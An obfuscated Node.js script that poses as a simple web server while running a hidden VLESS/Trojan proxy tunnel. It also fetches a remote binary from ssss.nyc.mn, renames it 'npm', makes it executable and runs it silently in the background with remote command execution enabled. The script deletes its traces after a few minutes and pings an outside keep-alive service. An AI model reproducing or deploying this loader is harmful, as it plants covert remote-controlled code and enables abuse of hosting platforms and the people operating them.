const _0x1c251d=_0x3ce8;(function(_0x465a65,_0x372cf0){const _0x29b1bb=_0x3ce8,_0x1e05bf=_0x465a65();while(!![]){try{const _0x39d0c0=parseInt(_0x29b1bb(0x16d))/0x1*(-parseInt(_0x29b1bb(0x172))/0x2)+-parseInt(_0x29b1bb(0x11c))/0x3+-parseInt(_0x29b1bb(0x14f))/0x4+-parseInt(_0x29b1bb(0x123))/0x5*(parseInt(_0x29b1bb(0x12a))/0x6)+-parseInt(_0x29b1bb(0x105))/0x7*(parseInt(_0x29b1bb(0x109))/0x8)+parseInt(_0x29b1bb(0x146))/0x9+parseInt(_0x29b1bb(0x177))/0xa*(parseInt(_0x29b1bb(0x10b))/0xb);if(_0x39d0c0===_0x372cf0)break;else _0x1e05bf['push'](_0x1e05bf['shift']());}catch(_0x3f7cce){_0x1e05bf['push'](_0x1e05bf['shift']());}}}(_0x11cf,0x7db61));const os=require('os'),http=require(_0x1c251d(0x153)),fs=require('fs'),axios=require(_0x1c251d(0x159)),net=require('net'),path=require(_0x1c251d(0x115)),crypto=require(_0x1c251d(0x114)),{Buffer}=require(_0x1c251d(0x134)),{exec,execSync}=require(_0x1c251d(0x131)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1c251d(0x15c)][_0x1c251d(0x147)]||'5eddfea4-f6d4-91fd-b8f0-17ekk8649c60',NEZHA_SERVER=process[_0x1c251d(0x15c)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x1c251d(0x15c)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x1c251d(0x15c)][_0x1c251d(0x152)]||'',DOMAIN=process[_0x1c251d(0x15c)][_0x1c251d(0x168)]||_0x1c251d(0x15f),AUTO_ACCESS=process['env'][_0x1c251d(0x179)]||!![],WSPATH=process[_0x1c251d(0x15c)][_0x1c251d(0x11d)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x1c251d(0x15c)][_0x1c251d(0x128)]||_0x1c251d(0x142),NAME=process[_0x1c251d(0x15c)][_0x1c251d(0x14b)]||'Hug',PORT=process[_0x1c251d(0x15c)][_0x1c251d(0x166)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x4f6345=_0x1c251d;try{const _0x582a87=await axios['get']('https://speed.cloudflare.com/meta'),_0x28fe87=_0x582a87[_0x4f6345(0x158)];ISP=(_0x28fe87['country']+'-'+_0x28fe87[_0x4f6345(0x174)])[_0x4f6345(0x10e)](/ /g,'_');}catch(_0x2fca0c){ISP='Unknown';}};GetISP();function _0x3ce8(_0xd905d6,_0x15351b){const _0x11cf0d=_0x11cf();return _0x3ce8=function(_0x3ce835,_0x3a3f00){_0x3ce835=_0x3ce835-0x102;let _0x180070=_0x11cf0d[_0x3ce835];return _0x180070;},_0x3ce8(_0xd905d6,_0x15351b);}const httpServer=http[_0x1c251d(0x11b)]((_0xd5f8c1,_0x2b6eff)=>{const _0x32abd6=_0x1c251d;if(_0xd5f8c1['url']==='/'){const _0x4c7ca0=path[_0x32abd6(0x16e)](__dirname,'index.html');fs['readFile'](_0x4c7ca0,'utf8',(_0x23b35c,_0xf09dcb)=>{const _0x3713b5=_0x32abd6;if(_0x23b35c){_0x2b6eff[_0x3713b5(0x145)](0xc8,{'Content-Type':'text/html'}),_0x2b6eff[_0x3713b5(0x116)](_0x3713b5(0x169));return;}_0x2b6eff['writeHead'](0xc8,{'Content-Type':_0x3713b5(0x167)}),_0x2b6eff[_0x3713b5(0x116)](_0xf09dcb);});return;}else{if(_0xd5f8c1[_0x32abd6(0x103)]==='/'+SUB_PATH){const _0x533db2=_0x32abd6(0x102)+UUID+'@'+DOMAIN+_0x32abd6(0x13e)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x32abd6(0x162)+WSPATH+'#'+NAME+'-'+ISP,_0x4e986f='trojan://'+UUID+'@'+DOMAIN+_0x32abd6(0x14d)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x1a9f5f=_0x533db2+'\x0a'+_0x4e986f,_0x2bcfb5=Buffer[_0x32abd6(0x15d)](_0x1a9f5f)['toString'](_0x32abd6(0x156));_0x2b6eff[_0x32abd6(0x145)](0xc8,{'Content-Type':_0x32abd6(0x13a)}),_0x2b6eff[_0x32abd6(0x116)](_0x2bcfb5+'\x0a');}else _0x2b6eff[_0x32abd6(0x145)](0x194,{'Content-Type':_0x32abd6(0x13a)}),_0x2b6eff[_0x32abd6(0x116)](_0x32abd6(0x112));}}),wss=new WebSocket[(_0x1c251d(0x140))]({'server':httpServer}),uuid=UUID[_0x1c251d(0x10e)](/-/g,''),DNS_SERVERS=[_0x1c251d(0x12f),'1.1.1.1'];function resolveHost(_0x1e5d53){return new Promise((_0x5121ca,_0x25621d)=>{const _0x5a96fe=_0x3ce8;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5a96fe(0x161)](_0x1e5d53)){_0x5121ca(_0x1e5d53);return;}let _0xdd1320=0x0;function _0x3defb(){const _0x7bb292=_0x5a96fe;if(_0xdd1320>=DNS_SERVERS['length']){_0x25621d(new Error(_0x7bb292(0x141)+_0x1e5d53+_0x7bb292(0x108)));return;}const _0x156dcc=DNS_SERVERS[_0xdd1320];_0xdd1320++;const _0xd750b7='https://dns.google/resolve?name='+encodeURIComponent(_0x1e5d53)+'&type=A';axios['get'](_0xd750b7,{'timeout':0x1388,'headers':{'Accept':_0x7bb292(0x12d)}})[_0x7bb292(0x149)](_0x472aeb=>{const _0x564dc1=_0x7bb292,_0x1c1ac6=_0x472aeb[_0x564dc1(0x158)];if(_0x1c1ac6[_0x564dc1(0x144)]===0x0&&_0x1c1ac6[_0x564dc1(0x129)]&&_0x1c1ac6[_0x564dc1(0x129)][_0x564dc1(0x106)]>0x0){const _0x126771=_0x1c1ac6[_0x564dc1(0x129)][_0x564dc1(0x11f)](_0xe9e7fd=>_0xe9e7fd[_0x564dc1(0x154)]===0x1);if(_0x126771){_0x5121ca(_0x126771[_0x564dc1(0x158)]);return;}}_0x3defb();})[_0x7bb292(0x171)](_0x14f9ea=>{_0x3defb();});}_0x3defb();});}function _0x11cf(){const _0x58d137=['crypto','path','end','message','client_secret:\x20','443','every','createServer','1881546ZRPHAc','WSPATH','readUInt8','find','Automatic\x20Access\x20Task\x20added\x20successfully','send','sha224','100cCYJGL','map','toString','reduce','https://arm64.ssss.nyc.mn/agent','SUB_PATH','Answer','294666MMMAet','utf-8','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','application/dns-json','2083','8.8.4.4','finish','child_process','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','npm','buffer','slice','split','hex','listen','digest','text/plain','2053','createHash','writeFileSync',':443?encryption=none&security=tls&sni=','log','Server','Failed\x20to\x20resolve\x20','sub','decode','Status','writeHead','3944709XpltzK','UUID','8443','then','true','NAME','readUInt16BE',':443?security=tls&sni=','connection','1542628EHunRn','pipe','2087','NEZHA_KEY','http','type','error','base64','substr','data','axios','https://oooo.serv00.net/add-url','arm','env','from','npm\x20is\x20running','1234.abc.com','post','test','&path=%2F','pop','https://','false','PORT','text/html','DOMAIN','Hello\x20world!','once','write','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','862819sCoHRI','join','\x20-p\x20','includes','catch','2oZFovj','/bin/bash','asOrganization','get','close','430pHVYxT','Server\x20is\x20running\x20on\x20port\x20','AUTO_ACCESS','https://amd64.ssss.nyc.mn/agent','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','error:\x20','vless://','url','aarch64','7aHXvtF','length','unlink','\x20with\x20all\x20DNS\x20servers','1005528KLWnxs','trim','782837cdxWuv','connect','chmod\x20+x\x20npm','replace','config.yaml','https://arm64.ssss.nyc.mn/v1','arm64','Not\x20Found\x0a','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&'];_0x11cf=function(){return _0x58d137;};return _0x11cf();}function handleVlessConnection(_0x5cfe7a,_0x996486){const _0x33bf71=_0x1c251d,[_0x3bafad]=_0x996486,_0x465498=_0x996486['slice'](0x1,0x11);if(!_0x465498[_0x33bf71(0x11a)]((_0x7a768c,_0x285f02)=>_0x7a768c==parseInt(uuid['substr'](_0x285f02*0x2,0x2),0x10)))return![];let _0x28c4ff=_0x996486['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x2fecf6=_0x996486['slice'](_0x28c4ff,_0x28c4ff+=0x2)[_0x33bf71(0x14c)](0x0),_0x1bb458=_0x996486[_0x33bf71(0x135)](_0x28c4ff,_0x28c4ff+=0x1)[_0x33bf71(0x11e)](),_0x5a9ba5=_0x1bb458==0x1?_0x996486['slice'](_0x28c4ff,_0x28c4ff+=0x4)[_0x33bf71(0x16e)]('.'):_0x1bb458==0x2?new TextDecoder()[_0x33bf71(0x143)](_0x996486[_0x33bf71(0x135)](_0x28c4ff+0x1,_0x28c4ff+=0x1+_0x996486['slice'](_0x28c4ff,_0x28c4ff+0x1)[_0x33bf71(0x11e)]())):_0x1bb458==0x3?_0x996486[_0x33bf71(0x135)](_0x28c4ff,_0x28c4ff+=0x10)[_0x33bf71(0x126)]((_0x212b8b,_0x3f3a21,_0x13390d,_0x3211f7)=>_0x13390d%0x2?_0x212b8b['concat'](_0x3211f7[_0x33bf71(0x135)](_0x13390d-0x1,_0x13390d+0x1)):_0x212b8b,[])[_0x33bf71(0x124)](_0x528d8c=>_0x528d8c['readUInt16BE'](0x0)[_0x33bf71(0x125)](0x10))[_0x33bf71(0x16e)](':'):'';_0x5cfe7a[_0x33bf71(0x121)](new Uint8Array([_0x3bafad,0x0]));const _0x5f43d3=createWebSocketStream(_0x5cfe7a);return resolveHost(_0x5a9ba5)[_0x33bf71(0x149)](_0x3404ab=>{const _0xbf32a1=_0x33bf71;net['connect']({'host':_0x3404ab,'port':_0x2fecf6},function(){const _0xf5ffc4=_0x3ce8;this[_0xf5ffc4(0x16b)](_0x996486[_0xf5ffc4(0x135)](_0x28c4ff)),_0x5f43d3['on'](_0xf5ffc4(0x155),()=>{})['pipe'](this)['on']('error',()=>{})[_0xf5ffc4(0x150)](_0x5f43d3);})['on'](_0xbf32a1(0x155),()=>{});})[_0x33bf71(0x171)](_0x1568f3=>{const _0x4eac0a=_0x33bf71;net[_0x4eac0a(0x10c)]({'host':_0x5a9ba5,'port':_0x2fecf6},function(){const _0x4c94f6=_0x4eac0a;this[_0x4c94f6(0x16b)](_0x996486[_0x4c94f6(0x135)](_0x28c4ff)),_0x5f43d3['on'](_0x4c94f6(0x155),()=>{})[_0x4c94f6(0x150)](this)['on'](_0x4c94f6(0x155),()=>{})[_0x4c94f6(0x150)](_0x5f43d3);})['on'](_0x4eac0a(0x155),()=>{});}),!![];}function handleTrojanConnection(_0x158921,_0x594b0a){const _0x43f9b6=_0x1c251d;try{if(_0x594b0a[_0x43f9b6(0x106)]<0x3a)return![];const _0x2d5d0d=_0x594b0a[_0x43f9b6(0x135)](0x0,0x38)[_0x43f9b6(0x125)](),_0x23b034=[UUID];let _0x301d77=null;for(const _0xfdcb50 of _0x23b034){const _0x2cefeb=crypto[_0x43f9b6(0x13c)](_0x43f9b6(0x122))['update'](_0xfdcb50)[_0x43f9b6(0x139)](_0x43f9b6(0x137));if(_0x2cefeb===_0x2d5d0d){_0x301d77=_0xfdcb50;break;}}if(!_0x301d77)return![];let _0x32522e=0x38;_0x594b0a[_0x32522e]===0xd&&_0x594b0a[_0x32522e+0x1]===0xa&&(_0x32522e+=0x2);const _0x2f5f32=_0x594b0a[_0x32522e];if(_0x2f5f32!==0x1)return![];_0x32522e+=0x1;const _0x4007ad=_0x594b0a[_0x32522e];_0x32522e+=0x1;let _0x10dae5,_0x5eb73a;if(_0x4007ad===0x1)_0x10dae5=_0x594b0a['slice'](_0x32522e,_0x32522e+0x4)[_0x43f9b6(0x16e)]('.'),_0x32522e+=0x4;else{if(_0x4007ad===0x3){const _0x1f4020=_0x594b0a[_0x32522e];_0x32522e+=0x1,_0x10dae5=_0x594b0a[_0x43f9b6(0x135)](_0x32522e,_0x32522e+_0x1f4020)['toString'](),_0x32522e+=_0x1f4020;}else{if(_0x4007ad===0x4)_0x10dae5=_0x594b0a['slice'](_0x32522e,_0x32522e+0x10)['reduce']((_0x3b4f41,_0x15000b,_0x1c113d,_0x4746c2)=>_0x1c113d%0x2?_0x3b4f41['concat'](_0x4746c2[_0x43f9b6(0x135)](_0x1c113d-0x1,_0x1c113d+0x1)):_0x3b4f41,[])[_0x43f9b6(0x124)](_0x485634=>_0x485634[_0x43f9b6(0x14c)](0x0)[_0x43f9b6(0x125)](0x10))[_0x43f9b6(0x16e)](':'),_0x32522e+=0x10;else return![];}}_0x5eb73a=_0x594b0a[_0x43f9b6(0x14c)](_0x32522e),_0x32522e+=0x2;_0x32522e<_0x594b0a['length']&&_0x594b0a[_0x32522e]===0xd&&_0x594b0a[_0x32522e+0x1]===0xa&&(_0x32522e+=0x2);const _0x53db9c=createWebSocketStream(_0x158921);return resolveHost(_0x10dae5)['then'](_0x2b95ca=>{const _0x5d601a=_0x43f9b6;net[_0x5d601a(0x10c)]({'host':_0x2b95ca,'port':_0x5eb73a},function(){const _0x1e6028=_0x5d601a;_0x32522e<_0x594b0a[_0x1e6028(0x106)]&&this[_0x1e6028(0x16b)](_0x594b0a[_0x1e6028(0x135)](_0x32522e)),_0x53db9c['on'](_0x1e6028(0x155),()=>{})[_0x1e6028(0x150)](this)['on']('error',()=>{})[_0x1e6028(0x150)](_0x53db9c);})['on'](_0x5d601a(0x155),()=>{});})[_0x43f9b6(0x171)](_0x29867b=>{const _0x3e27c5=_0x43f9b6;net[_0x3e27c5(0x10c)]({'host':_0x10dae5,'port':_0x5eb73a},function(){const _0x54a2cb=_0x3e27c5;_0x32522e<_0x594b0a['length']&&this[_0x54a2cb(0x16b)](_0x594b0a['slice'](_0x32522e)),_0x53db9c['on']('error',()=>{})[_0x54a2cb(0x150)](this)['on'](_0x54a2cb(0x155),()=>{})[_0x54a2cb(0x150)](_0x53db9c);})['on']('error',()=>{});}),!![];}catch(_0x5a433d){return![];}}wss['on'](_0x1c251d(0x14e),(_0x1cfff2,_0x1adc69)=>{const _0x55d9a2=_0x1c251d,_0x52db3d=_0x1adc69[_0x55d9a2(0x103)]||'';_0x1cfff2[_0x55d9a2(0x16a)](_0x55d9a2(0x117),_0x36e2a9=>{const _0xeca4a9=_0x55d9a2;if(_0x36e2a9[_0xeca4a9(0x106)]>0x11&&_0x36e2a9[0x0]===0x0){const _0x20c004=_0x36e2a9[_0xeca4a9(0x135)](0x1,0x11),_0x54ffb5=_0x20c004[_0xeca4a9(0x11a)]((_0x35980f,_0x1e027b)=>_0x35980f==parseInt(uuid[_0xeca4a9(0x157)](_0x1e027b*0x2,0x2),0x10));if(_0x54ffb5){!handleVlessConnection(_0x1cfff2,_0x36e2a9)&&_0x1cfff2[_0xeca4a9(0x176)]();return;}}!handleTrojanConnection(_0x1cfff2,_0x36e2a9)&&_0x1cfff2[_0xeca4a9(0x176)]();})['on'](_0x55d9a2(0x155),()=>{});});const getDownloadUrl=()=>{const _0x1835cc=_0x1c251d,_0x256113=os['arch']();return _0x256113===_0x1835cc(0x15b)||_0x256113===_0x1835cc(0x111)||_0x256113===_0x1835cc(0x104)?!NEZHA_PORT?_0x1835cc(0x110):_0x1835cc(0x127):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x1835cc(0x17a);},downloadFile=async()=>{const _0x2776a9=_0x1c251d;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1f0ab1=getDownloadUrl(),_0x2cd029=await axios({'method':_0x2776a9(0x175),'url':_0x1f0ab1,'responseType':'stream'}),_0x1a7229=fs['createWriteStream'](_0x2776a9(0x133));return _0x2cd029[_0x2776a9(0x158)][_0x2776a9(0x150)](_0x1a7229),new Promise((_0x94536a,_0x56b2e8)=>{const _0xb84cd9=_0x2776a9;_0x1a7229['on'](_0xb84cd9(0x130),()=>{const _0x50a031=_0xb84cd9;console[_0x50a031(0x13f)]('npm\x20download\x20successfully'),exec(_0x50a031(0x10d),_0x40c1c1=>{if(_0x40c1c1)_0x56b2e8(_0x40c1c1);_0x94536a();});}),_0x1a7229['on']('error',_0x56b2e8);});}catch(_0x146f57){throw _0x146f57;}},runnz=async()=>{const _0x11076d=_0x1c251d;try{const _0x4ee6af=execSync(_0x11076d(0x17b),{'encoding':_0x11076d(0x12b)});if(_0x4ee6af[_0x11076d(0x10a)]()!==''){console[_0x11076d(0x13f)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x4993da){}await downloadFile();let _0x3c3fd2='',_0x3fccc8=[_0x11076d(0x119),_0x11076d(0x148),'2096',_0x11076d(0x151),_0x11076d(0x12e),_0x11076d(0x13b)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x72c84b=_0x3fccc8[_0x11076d(0x170)](NEZHA_PORT)?'--tls':'';_0x3c3fd2='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x11076d(0x16f)+NEZHA_KEY+'\x20'+_0x72c84b+_0x11076d(0x113);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5746b3=NEZHA_SERVER[_0x11076d(0x170)](':')?NEZHA_SERVER[_0x11076d(0x136)](':')[_0x11076d(0x163)]():'',_0x910ded=_0x3fccc8[_0x11076d(0x170)](_0x5746b3)?_0x11076d(0x14a):_0x11076d(0x165),_0x518fce=_0x11076d(0x118)+NEZHA_KEY+_0x11076d(0x132)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x910ded+_0x11076d(0x12c)+UUID;fs[_0x11076d(0x13d)]('config.yaml',_0x518fce);}_0x3c3fd2='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x11076d(0x13f)](_0x11076d(0x16c));return;}}try{exec(_0x3c3fd2,{'shell':_0x11076d(0x173)},_0x6081e=>{const _0x557140=_0x11076d;if(_0x6081e)console[_0x557140(0x155)]('npm\x20running\x20error:',_0x6081e);else console[_0x557140(0x13f)](_0x557140(0x15e));});}catch(_0x53e5bb){console[_0x11076d(0x155)](_0x11076d(0x17c)+_0x53e5bb);}};async function addAccessTask(){const _0x28a9a8=_0x1c251d;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xffd96f=_0x28a9a8(0x164)+DOMAIN;try{const _0x2d4dc3=await axios[_0x28a9a8(0x160)](_0x28a9a8(0x15a),{'url':_0xffd96f},{'headers':{'Content-Type':'application/json'}});console['log'](_0x28a9a8(0x120));}catch(_0x1c7968){}}const delFiles=()=>{const _0xa584dc=_0x1c251d;fs[_0xa584dc(0x107)](_0xa584dc(0x133),()=>{}),fs[_0xa584dc(0x107)](_0xa584dc(0x10f),()=>{});};httpServer[_0x1c251d(0x138)](PORT,()=>{const _0x1eece3=_0x1c251d;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1eece3(0x13f)](_0x1eece3(0x178)+PORT);});
